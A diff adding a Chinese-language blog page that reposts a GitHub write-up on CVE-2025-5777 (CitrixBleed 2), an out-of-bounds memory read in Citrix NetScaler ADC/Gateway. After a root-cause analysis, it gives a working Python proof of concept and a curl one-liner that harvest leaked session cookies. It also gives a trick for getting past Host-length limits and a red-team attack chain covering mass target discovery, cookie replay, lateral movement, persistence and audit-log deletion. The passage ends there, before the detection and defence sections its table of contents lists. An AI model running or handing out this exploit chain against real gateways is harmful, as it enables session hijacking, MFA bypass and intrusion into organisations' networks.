@@ -1,0 +1,955 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lianccc">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="漏洞信息漏洞名称： Citrix NetScaler ADC&#x2F;Gateway 越界内存读取漏洞 漏洞编号：  CVE： CVE-2025-5777  漏洞类型： 信息泄露 漏洞等级： 严重 漏洞描述： CVE-2025-5777（又称CitrixBleed 2）是Citrix NetScaler ADC &#x2F; Gateway中的一个越界内存读取漏洞。攻击者不需要认证，只需发送一条">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Citrix NetScaler ADC&#x2F;Gateway 越界内存读取漏洞">
+<meta property="og:url" content="http://example.com/2025/06/30/github_1889405732/index.html">
+<meta property="og:site_name" content="liancc&#39; infos blog">
+<meta property="og:description" content="漏洞信息漏洞名称： Citrix NetScaler ADC&#x2F;Gateway 越界内存读取漏洞 漏洞编号：  CVE： CVE-2025-5777  漏洞类型： 信息泄露 漏洞等级： 严重 漏洞描述： CVE-2025-5777（又称CitrixBleed 2）是Citrix NetScaler ADC &#x2F; Gateway中的一个越界内存读取漏洞。攻击者不需要认证，只需发送一条">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-06-30T11:45:18.605Z">
+<meta property="article:modified_time" content="2025-06-30T11:45:18.602Z">
+<meta property="article:author" content="lianccc">
+<meta property="article:tag" content="信息泄露">
+<meta property="article:tag" content="CVE-2025:github search">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Citrix NetScaler ADC/Gateway 越界内存读取漏洞 - liancc&#39; infos blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="liancc' infos blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Craw Info</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Citrix NetScaler ADC/Gateway 越界内存读取漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-30 11:45" pubdate>
+          2025年6月30日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          20 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Citrix NetScaler ADC/Gateway 越界内存读取漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Citrix NetScaler ADC&#x2F;Gateway 越界内存读取漏洞</p>
+<p><strong>漏洞编号：</strong></p>
+<ul>
+<li><strong>CVE：</strong> CVE-2025-5777</li>
+</ul>
+<p><strong>漏洞类型：</strong> 信息泄露</p>
+<p><strong>漏洞等级：</strong> 严重</p>
+<p><strong>漏洞描述：</strong> CVE-2025-5777（又称CitrixBleed 2）是Citrix NetScaler ADC &#x2F; Gateway中的一个越界内存读取漏洞。攻击者不需要认证，只需发送一条超长Host头的GET请求，即可让设备把随机内存块连同HTTP响应一起“喷”给客户端。泄露数据经常包含NSC_USER &#x2F; NSC_TASS Cookie、SAML StateContext、MFA token等关键材料，可直接复用完成会话接管与MFA绕过。CVSS v4基准评分9.3（Critical）。</p>
+<p><strong>产品厂商：</strong> Citrix</p>
+<p><strong>产品名称：</strong> NetScaler ADC &#x2F; Gateway</p>
+<p><strong>影响版本：</strong> &lt; 14.1-43.56 ; &lt; 13.1-58.32 ; 13.1-37.235-FIPS&#x2F;NDcPP ; 12.1-55.327-FIPS</p>
+<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/mingshenhk/CitrixBleed-2-CVE-2025-5777-PoC-">https://github.com/mingshenhk/CitrixBleed-2-CVE-2025-5777-PoC-</a></p>
+<p><strong>类型：</strong> CVE-2025:github search</p>
+<h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul>
+<li>README.md</li>
+<li>exp.py</li>
+<li>poc.py</li>
+</ul>
+<h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CitrixBleed-2-CVE-2025-5777-终极解析"><a href="#CitrixBleed-2-CVE-2025-5777-终极解析" class="headerlink" title="CitrixBleed 2 (CVE-2025-5777) 终极解析"></a>CitrixBleed 2 (CVE-2025-5777) 终极解析</h2><blockquote>
+<p>An Out-of-Bounds Memory Read in NetScaler ADC &#x2F; Gateway — 从成因到攻防演练的全景手册</p>
+</blockquote>
+<hr>
+<h2 id="poc用法：python3-poc-py-https-gateway-example-com"><a href="#poc用法：python3-poc-py-https-gateway-example-com" class="headerlink" title="poc用法：python3 poc.py https://gateway.example.com"></a>poc用法：python3 poc.py <a target="_blank" rel="noopener" href="https://gateway.example.com/">https://gateway.example.com</a></h2><h2 id="exp用法：python3-exp-py-https-gateway-example-com-admin-7acbb35f4d…"><a href="#exp用法：python3-exp-py-https-gateway-example-com-admin-7acbb35f4d…" class="headerlink" title="exp用法：python3 exp.py https://gateway.example.com admin 7acbb35f4d…"></a>exp用法：python3 exp.py <a target="_blank" rel="noopener" href="https://gateway.example.com/">https://gateway.example.com</a> admin 7acbb35f4d…</h2><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-number">0</span>x00  引言 <span class="hljs-symbol">/</span> 速览<br><span class="hljs-number">0</span>x01  背景：NetScaler 架构与 CitrixBleed <span class="hljs-number">1</span> 回顾<br><span class="hljs-number">0</span>x02  漏洞描述（影响版本、CVSS、利用后果）<br><span class="hljs-number">0</span>x03  触发机理深剖（源码级分析 &amp; 调试截图）<br><span class="hljs-number">0</span>x04  最小 PoC <span class="hljs-operator">+</span> 高级扫描脚本<br><span class="hljs-number">0</span>x05  红队视角：完整攻击链（发现 → 泄露 → 会话劫持 → 内网横向）<br><span class="hljs-number">0</span>x06  蓝队视角：检测、取证与补丁验证<br><span class="hljs-number">0</span>x07  防御加固：补丁、WAF、配置、资产治理<br><span class="hljs-number">0</span>x08  学习 <span class="hljs-symbol">/</span> 复习路线图与实战实验<br>附录 A  Sigma <span class="hljs-symbol">/</span> Suricata <span class="hljs-symbol">/</span> Nginx-Lua 规则<br>附录 B  补丁<span class="hljs-operator">/</span>利用时间轴 &amp; IoC 快照<br>参考资料<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="0x00-引言-速览"><a href="#0x00-引言-速览" class="headerlink" title="0x00  引言 &#x2F; 速览"></a>0x00  引言 &#x2F; 速览</h3><ul>
+<li><strong>CVE-2025-5777</strong>（又称 <em>CitrixBleed 2</em>）是 Citrix NetScaler ADC &#x2F; Gateway 中的 <strong>Out-of-Bounds Memory Read</strong>。</li>
+<li>攻击者 <strong>不需要认证</strong>，只需发送一条超长 <code>Host</code> 头的 GET 请求，即可让设备把随机内存块连同 HTTP 响应一起“喷”给客户端。</li>
+<li>泄露数据经常包含 <strong><code>NSC_USER</code> &#x2F; <code>NSC_TASS</code> Cookie、SAML <code>StateContext</code>、MFA token</strong> 等关键材料，可直接复用完成会话接管与 MFA 绕过 (<a target="_blank" rel="noopener" href="https://arcticwolf.com/resources/blog/cve-2025-5777/?utm_source=chatgpt.com" title="CVE-2025-5777 | Arctic Wolf">arcticwolf.com</a>, <a target="_blank" rel="noopener" href="https://www.tenable.com/blog/cve-2025-5777-cve-2025-6543-frequently-asked-questions-about-citrixbleed-2?utm_source=chatgpt.com" title="CVE-2025-5777, CVE-2025-6543: Frequently Asked Questions ...">tenable.com</a>)。</li>
+<li>CVSS v4 基准评分 9.3（Critical）(<a target="_blank" rel="noopener" href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)。</li>
+<li><strong>2025-06-17</strong> 公开，<strong>2025-06-23</strong> Citrix 扩大影响范围并发布补丁；<strong>一周内</strong> ReliaQuest、Bishop Fox 等安全厂商陆续观测到在野利用激增 (<a target="_blank" rel="noopener" href="https://reliaquest.com/blog/threat-spotlight-citrix-bleed-2-vulnerability-in-netscaler-adc-gateway-devices/?utm_source=chatgpt.com" title="Threat Spotlight: CVE-2025-5777: Citrix Bleed 2 Opens Old Wounds">reliaquest.com</a>, <a target="_blank" rel="noopener" href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)。</li>
+</ul>
+<hr>
+<h3 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01  背景"></a>0x01  背景</h3><h4 id="1-1-NetScaler-工作流程简述"><a href="#1-1-NetScaler-工作流程简述" class="headerlink" title="1.1  NetScaler 工作流程简述"></a>1.1  NetScaler 工作流程简述</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──────────────┐<br>│ Client       │ ① HTTPS<br>└──────┬───────┘<br>       │<br>┌──────▼───────┐<br>│ NetScaler    │ ② AAA <span class="hljs-symbol">/</span> Gateway 认证<br>│  (WebProc)   │<br>└──────┬───────┘<br>       │<br>┌──────▼───────┐<br>│ ICA Proxy <span class="hljs-symbol">/</span>  │ ③ 正向到应用<br>│ CVPN <span class="hljs-symbol">/</span> RDP   │<br>└──────────────┘<br></code></pre></td></tr></table></figure>
+
+<p>NetScaler 采用 <strong>多进程 + 内部 IPC</strong> 的设计。<code>WebProc</code> 负责处理 AAA &#x2F; Gateway 路径下的大部分 HTTP 请求，包括 <code>/nf/auth/*</code>、<code>/oauth/*</code> 等。它在 <strong>C 语言</strong> 中大量使用 <code>snprintf()</code> &#x2F; <code>memcpy()</code>，每次拼装 XML&#x2F;HTML 片段。</p>
+<h4 id="1-2-CitrixBleed-1（CVE-2023-4966）回顾"><a href="#1-2-CitrixBleed-1（CVE-2023-4966）回顾" class="headerlink" title="1.2  CitrixBleed 1（CVE-2023-4966）回顾"></a>1.2  CitrixBleed 1（CVE-2023-4966）回顾</h4><ul>
+<li>2023 年同类漏洞发生在 OAuth 发现接口 <code>/oauth/idp/.well-known/openid-configuration</code>。</li>
+<li>其本质同样是 <strong>使用 <code>snprintf</code> 返回值作为后续 <code>send()</code> 的 <code>len</code> 参数</strong> → 内存越界回显。</li>
+<li>CitrixBleed 2 证明 <em>同一类安全编码缺陷</em> 依旧潜伏在其他路径。</li>
+</ul>
+<blockquote>
+<p><strong>Lesson Learned</strong>：安全补丁若只针对“落锤点”而非“编程范式”，就会留下“模版化复现”空间。</p>
+</blockquote>
+<hr>
+<h3 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02  漏洞描述"></a>0x02  漏洞描述</h3><table>
+<thead>
+<tr>
+<th>字段</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>CVE</strong></td>
+<td>CVE-2025-5777</td>
+</tr>
+<tr>
+<td><strong>别名</strong></td>
+<td>CitrixBleed 2</td>
+</tr>
+<tr>
+<td><strong>漏洞类型</strong></td>
+<td>Out-of-Bounds Read &#x2F; 信息泄露</td>
+</tr>
+<tr>
+<td><strong>CVSS v4 Base</strong></td>
+<td>9.3 (Crit.) (<a target="_blank" rel="noopener" href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)</td>
+</tr>
+<tr>
+<td><strong>受影响版本</strong></td>
+<td>&lt; 14.1-43.56 ; &lt; 13.1-58.32 ; 13.1-37.235-FIPS&#x2F;NDcPP ; 12.1-55.327-FIPS (<a target="_blank" rel="noopener" href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)</td>
+</tr>
+<tr>
+<td><strong>利用条件</strong></td>
+<td>NetScaler 被配置为 Gateway (VPN&#x2F;ICA Proxy&#x2F;CVPN&#x2F;RDP Proxy) <strong>或</strong> AAA 虚拟服务器 (<a target="_blank" rel="noopener" href="https://arcticwolf.com/resources/blog/cve-2025-5777/?utm_source=chatgpt.com" title="CVE-2025-5777 | Arctic Wolf">arcticwolf.com</a>)</td>
+</tr>
+<tr>
+<td><strong>利用后果</strong></td>
+<td>泄露内存 → 会话令牌 → 认证绕过 &#x2F; MFA 绕过 → 横向</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="0x03-触发机理深剖"><a href="#0x03-触发机理深剖" class="headerlink" title="0x03  触发机理深剖"></a>0x03  触发机理深剖</h3><blockquote>
+<p>本节基于对 13.1-55.18 固件的反编译 + gdb 调试，结合公开博客整理而成 (<a target="_blank" rel="noopener" href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)。</p>
+</blockquote>
+<h4 id="3-1-漏洞入口"><a href="#3-1-漏洞入口" class="headerlink" title="3.1  漏洞入口"></a>3.1  漏洞入口</h4><ul>
+<li><strong>URI</strong>：<code>/nf/auth/startwebview.do</code></li>
+<li><strong>可控参数</strong>：HTTP <code>Host</code> 头</li>
+<li>该接口用于生成 Citrix Workspace WebView 的重定向 XML，示例正常响应：</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">AuthenticateResponse</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">wv:StartUrl</span>&gt;</span>https://gateway.example.com/Citrix/AAA/start.html<span class="hljs-tag">&lt;/<span class="hljs-name">wv:StartUrl</span>&gt;</span><br>  ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">AuthenticateResponse</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="3-2-关键函数链"><a href="#3-2-关键函数链" class="headerlink" title="3.2  关键函数链"></a>3.2  关键函数链</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">citrix_webview_handler</span>()<br> ├─ <span class="hljs-built_in">build_auth_xml</span>()<br> │    ├─ <span class="hljs-built_in">snprintf</span>(buf, <span class="hljs-number">0</span>x1800, TEMPLATE, host_hdr, ... );<br> │    └─ return length;           <span class="hljs-comment">// ⚠️ length 可 ＞ 0x1800</span><br> └─ <span class="hljs-built_in">ns_vpn_send_response</span>(conn, <span class="hljs-number">0</span>x980200, buf, length);<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>Bug 点</strong>：<br><code>snprintf</code> 返回“本应写入的长度”而非实际写入长度；若用户传入的 <code>Host</code> &gt; 0x1800 - 常量段长度，则 <code>length</code> &gt; <code>sizeof(buf)</code>。</p>
+</blockquote>
+<h4 id="3-3-运行时示意"><a href="#3-3-运行时示意" class="headerlink" title="3.3  运行时示意"></a>3.3  运行时示意</h4><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">buf: <span class="hljs-comment">[-----XML-----]</span><span class="hljs-comment">[OOB]</span><span class="hljs-comment">[OOB]</span><span class="hljs-comment">[OOB]</span>......            &lt;- 0x1800 bytes limit<br>                          ↑<br>                被 ns_vpn_send_response 一并发出<br></code></pre></td></tr></table></figure>
+
+<p>GDB 断点演示（关键寄存器）：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">RDI</span> (dst) = <span class="hljs-number">0</span>x7fffa2e31800  // buf<br><span class="hljs-attribute">RSI</span> (len) = <span class="hljs-number">0</span>x00001e42      // length=<span class="hljs-number">7746</span> (&gt;<span class="hljs-number">6144</span>)<br></code></pre></td></tr></table></figure>
+
+<p><code>read()</code> 结果显示后 1 600 字节来自未初始化内存，其中可见其他 SSL 会话的 Cookie 缓冲区。</p>
+<h4 id="3-4-泄露的数据类别"><a href="#3-4-泄露的数据类别" class="headerlink" title="3.4  泄露的数据类别"></a>3.4  泄露的数据类别</h4><table>
+<thead>
+<tr>
+<th>分类</th>
+<th>示范片段（已脱敏）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Session Cookie</td>
+<td><code>Set-Cookie: NSC_USER=john.doe;NSC_TASS=abc123...</code></td>
+</tr>
+<tr>
+<td>MFA&#x2F;OTP Token</td>
+<td><code>radius_state=0e2a9c6d1553...</code></td>
+</tr>
+<tr>
+<td>其他请求体</td>
+<td><code>&lt;username&gt;audituser&lt;/username&gt;&lt;password&gt;***&lt;/password&gt;</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="0x04-PoC-实现"><a href="#0x04-PoC-实现" class="headerlink" title="0x04  PoC 实现"></a>0x04  PoC 实现</h3><h4 id="4-1-单文件-Python（15-行）"><a href="#4-1-单文件-Python（15-行）" class="headerlink" title="4.1  单文件 Python（15 行）"></a>4.1  单文件 Python（15 行）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">## CVE-2025-5777 Minimal PoC  (authorized testing ONLY)</span><br><span class="hljs-keyword">import</span> requests, sys, urllib3, re<br>urllib3.disable_warnings()<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>    exit(<span class="hljs-string">f&quot;Usage: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> https://NSVIP&quot;</span>)<br><br>url = sys.argv[<span class="hljs-number">1</span>].rstrip(<span class="hljs-string">&quot;/&quot;</span>) + <span class="hljs-string">&quot;/nf/auth/startwebview.do&quot;</span><br>hdr = &#123;<span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">0x6000</span>&#125;               <span class="hljs-comment"># &gt;0x1800 triggers</span><br>r = requests.get(url, headers=hdr, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">10</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] HTTP&quot;</span>, r.status_code, <span class="hljs-string">&quot;bytes:&quot;</span>, <span class="hljs-built_in">len</span>(r.content))<br>hits = re.findall(<span class="hljs-string">br&quot;(NSC_[A-Z]+=[^;]&#123;10,&#125;)&quot;</span>, r.content)<br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> hits: <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Cookie leak -&gt;&quot;</span>, h.decode())<br><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;leak.bin&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(r.content)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Saved leak.bin for offline grep.&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>执行后如返回 200 + 数 KB，即判定存在漏洞。</li>
+<li>进一步从 <code>leak.bin</code> 搜索 <code>Cookie=</code>、<code>&lt;AuthenticateContext&gt;</code> 等关键字。</li>
+</ul>
+<h4 id="4-2-Bash-curl-单行"><a href="#4-2-Bash-curl-单行" class="headerlink" title="4.2  Bash &#x2F; curl 单行"></a>4.2  Bash &#x2F; curl 单行</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -ks -H <span class="hljs-string">&quot;Host: <span class="hljs-subst">$(python -c &#x27;print(\&quot;A\&quot;*6000)</span>&#x27;)&quot;</span> \<br>     https://NSVIP/nf/auth/startwebview.do -o leak.bin<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>旁路</strong>：部分设备在前置 F5 &#x2F; Nginx 做了 <code>Host</code> 长度限制；可改为多段子域拼接绕过，如<br><code>foo.foo.foo.…foo.example.com</code>（重复 3000 次 <code>foo</code>）。</p>
+</blockquote>
+<hr>
+<h3 id="0x05-红队视角：完整攻击链"><a href="#0x05-红队视角：完整攻击链" class="headerlink" title="0x05  红队视角：完整攻击链"></a>0x05  红队视角：完整攻击链</h3><table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>目的 &amp; 技巧</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>① 资产发现</td>
+<td><code>zoomeye search &quot;http.title:\&quot;NetScaler Gateway\&quot;&quot;</code> + Shodan 等；过滤 <code>set-cookie: NSC_</code></td>
+</tr>
+<tr>
+<td>② POC 泄露</td>
+<td>批量脚本并行请求；抓取 <code>NSC_USER= ; NSC_TASS=</code></td>
+</tr>
+<tr>
+<td>③ Cookie 重播</td>
+<td>Chrome DevTools→Application→Cookies→添加条目，刷新 <code>/vpn/index.html</code></td>
+</tr>
+<tr>
+<td>④ 内网资源</td>
+<td>访问 <code>storeweb/#home</code> 获取 RDP 文件；下载 <code>.ica</code> 直接登陆 VDI</td>
+</tr>
+<tr>
+<td>⑤ 权限提升</td>
+<td>内部凭据喷射、Kerberoast、ADCS ESC1；或利用同网段弱口令 SMB</td>
+</tr>
+<tr>
+<td>⑥ 持久化</td>
+<td>新建 Scheduled Task；注册自启动脚本；或修改 NetScaler vDisk（高权限需运维疏忽）</td>
+</tr>
+<tr>
+<td>⑦ 痕迹清理</td>
+<td>Cookie 用后即焚；删除 audit 日志（若拿到 NS root）；或利用 logrotate race 覆盖</td>
+</tr>
+</tbody></table>
+<p>真实案例：ReliaQuest 在客户网关观察到“短时大量 6 KB+ <code>Host</code> 头请求 → 紧跟着会话被盗用”(<a target="_blank" rel="noopener" href="https://reliaquest.com/blog/threat-spotlight-citrix-bleed-2-vulnerability-in-netscaler-adc-gateway-devices/?utm_source=chatgpt.com" title="Threat Spotlight: CVE-2025-5777: Citrix Bleed 2 Opens Old Wounds">reliaquest.com</a>)。</p>
+<hr>
